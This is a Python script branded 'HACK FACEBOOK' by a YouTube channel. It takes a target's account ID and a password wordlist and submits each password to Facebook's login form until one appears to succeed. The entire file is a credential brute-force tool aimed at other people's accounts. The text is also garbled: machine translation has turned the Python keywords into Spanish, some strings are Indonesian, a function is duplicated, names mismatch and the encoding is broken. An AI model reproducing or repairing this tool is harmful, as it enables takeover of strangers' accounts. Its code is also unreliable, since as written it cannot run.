#! / usr / bin / env python
# - * - codificación: UTF-8 - * -
	
	
importar  os
importación  sys
 mecanizado de importación
importación  cookielib
importar al  azar 
 tiempo de importación

os . sistema ( 'claro' )

def  runntek ( s ):
        para  c  en  s  +  ' \ n ' :
                sys . la salida estándar . escribir ( c )
                sys . la salida estándar . rubor ()
                tiempo . dormir ( 10.  /  100 )

si  sys . plataforma  ==  "linux"  o  sys . plataforma  ==  "linux2" :
     GL  =  " \ 033 [96; 1m"  # Azul aguamarina
     BB  =  " \ 033 [34; 1m"  # Luz azul
     AA  =  " \ 033 [33; 1m"  # Luz amarilla
     GG  =  " \ 033 [32; 1m"  # Luz verde
     WW  =  " \ 033 [0; 1m"   # Luz blanca
     RR  =  " \ 033 [31; 1m"  # Luz roja
     CC  =  " \ 033 [36; 1 m"  # luz cian
     B  =  " \ 033 [34m"     # Azul
     Y  =  " \ 033 [33; 1m"     # Amarillo
     G  =  " \ 033 [32m"     # Verde
     W  =  " \ 033 [0; 1m"      # Blanco
     R  =  " \ 033 [31m"     # Rojo
     C  =  " \ 033 [36; 1m"     # Cian
     rand  = ( BB , AA , GG , WW , RR , CC )
     P  =  aleatorio . elección ( rand )
 cubierta def ():
    imprimir  "" "
    
    
    
    
     "" "
    runntek ( GL + "YouTube '@ TecnoSolution ^ _ ^ ..." )
    tiempo . dormir ( 1 )
    imprimir  ""
    imprimir  RR + "+ ============================================ + "
    imprimir  GG + "| ¢ â €€ HACK FACEBOOK Por TecnoSolution ¢ â € ¢ |"
    imprimir  RR + "+ ============================================ + "
    imprimir  WW + "| Script POR: TecnoSolution |"
    imprimir  GG + "| Reza antes de usar |"
    imprimir  WW + "| FACEBOOK: TecnoSolution |"
    imprima  Y + "| YouTube: TecnoSolution |"
    imprimir  WW + "| -------------------------------------------- | "
    imprimir  GL + "| VIDA DEL PROGRAMADOR [LOP] |"
    imprimir  WW + "| -------------------------------------------- | "
    imprimir  RR + "+ ============================================ + "
    imprimir  GG + "| ¢ â €€ HACK FACEBOOK Por TecnoSolution ¢ â € ¢ |"
    imprimir  RR + "+ ============================================ + "     


cubierta ()

email  =  str ( raw_input ( GL + "â € ¢ identificados la ID del objetivo \ 033 [33; 1m:" ))

passwordlist  =  str ( raw_input ( WW + "â € ¢ Ingrese el archivo de Contraseñas \ 033 [95m [pass.txt, pass1.txt, pass2.txt, pass3.txt] \ 033 [92; 1m:" ))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login  =  'https://www.facebook.com/login.php?login_attempt=1'


useragents  = [( 'Mozilla / 5.0 (X11; Linux x86_64; rv: 45.0) Gecko / 20100101 Firefox / 45.0' , 'Mozilla / 5.0 (X11; U; Linux i686; en-US; rv: 1.9.0.1) Geck' )]


def  runntek ( s ):
        para  c  en  s  +  ' \ n ' :
                sys . la salida estándar . escribir ( c )
                sys . la salida estándar . rubor ()
                tiempo . dormir ( 10.  /  100 )

def  main ():
         br global
        br  =  mecanizar . Navegador ()
        cj  =  cookielib . LWPCookieJar ()
        br . set_handle_robots ( Falso )
        br . set_handle_redirect ( True )
        br . set_cookiejar ( cj )
        br . set_handle_equiv ( True )
        br . set_handle_referer ( True )
        br . set_handle_refresh ( mecanizar . _http . HTTPRefreshProcessor (), max_time = 1 )
        bienvenido ()
        buscar ()
        imprimir  ""
        runntek ( RR + "Wordlis Tidak Ada yang Cocok" )
        runntek ( RR + "Kembangin Wordlistnya Sendiri Cuk" )
        tiempo . dormir ( 1 )
        imprimir  WW + 34 * "-"
        kol ()

def  Kol ():
    nok  =  raw_input ( "Editar Lista de palabras cuk.? \ 033 [96; 1 M [y / n]:" )
    si  nok  ==  "y" :
        print ( "Por favor escriba la orden \ 033 [92; 1m [nano pass.txt]!" )
        imprimir  WW + ( 41 * "-" )
        imprimir  GL + ( "" )
        os . sys . salida ()
    más :
        salida ( 0 )
def  bruto ( contraseña ):
        sys . la salida estándar . escribir ( GG + " \ r [+] \ 033 [97; 1m Probando ..... {} \ n " . formato ( contraseña ))
        sys . la salida estándar . rubor ()
        br . addheaders  = [( 'User-agent' , random . choice ( useragents ))]
        sitio  =  br . abrir ( iniciar sesión )
        br . select_form ( nr  =  0 )
        br . formulario [ 'correo electrónico' ] =  correo electrónico
        br . formulario [ 'pass' ] =  contraseña
        sub  =  br . enviar ()
        log  =  sub . geturl ()
        if  log  ! =  login  y ( no  'login_attempt'  en  log ):
                        print ( " \ 033 [92; 1m \ n \ n [+] \ 033 [97; 1m Contraseña Encontrada \ 033 [31; 1m === | \ 033 [96; 1m {}" . formato ( contraseña ))
                        imprimir  ""
                        raw_input ( WW + "PULSE ENTER PARA SALIR ....." )
                        sys . salida ( 1 )


def  search ():
         contraseña global
        contraseñas  =  abierto (lista de contraseñas , "r" )
        para  contraseña  en  contraseñas :
                contraseñas  =  contraseña . reemplazar ( " \ n " , "" )
                bruto ( contraseña )


#bienvenidos
def  bienvenido ():
        wel  =  GG + "" "
No olvides suscribirte al Canal de Youtube "TecnoSolution" 
Y darle LIKE al Video .... Gracias !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! !!!!!!!! \ 033 [96; 4m Vida del programador \ 033 [92; 1m
       | _ |
      "" "
        imprimir  bien
        imprimir  ""
        total  =  abierto (lista de contraseñas , "r" )
        total  =  total . readlines ()
        imprimir  ""
        imprimir  GL + "[*] Cuenta a Crackear: {}" . formato ( correo electrónico )
        imprimir  RR + "[*] Cantidad:" , len ( total ), WW +  "contraseñas"
        imprima  Y + "[*] Grietas, espere ..... \ n \ n "

if  __name__  ==  '__main__' :
        main ()
